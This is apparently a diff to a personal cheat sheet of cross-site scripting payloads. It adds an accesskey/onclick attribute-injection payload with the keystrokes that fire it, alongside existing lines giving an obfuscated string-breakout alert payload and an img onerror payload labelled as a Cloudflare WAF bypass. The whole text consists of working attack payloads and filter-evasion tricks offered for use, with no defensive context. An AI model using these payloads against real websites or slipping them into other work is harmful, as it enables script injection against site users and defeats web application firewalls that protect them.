@@ -1,3 +1,12 @@
+While browser ingore Js event handler to pop ,
+     “accesskey=”x”onclick=”alert(document.domain)”//
+
+To execute ---> (Press ALT+SHIFT+X on Windows) or (CTRL+ALT+X on OS X)
+
+
+
+
+
 "-top['al\x65rt']('sailay')-"   -----> Bypass of "-alert(0)-"
 Cloudflare WAF bypass: <img/src=x onError="`${x}`;alert(`Ex.Mi`);">
 
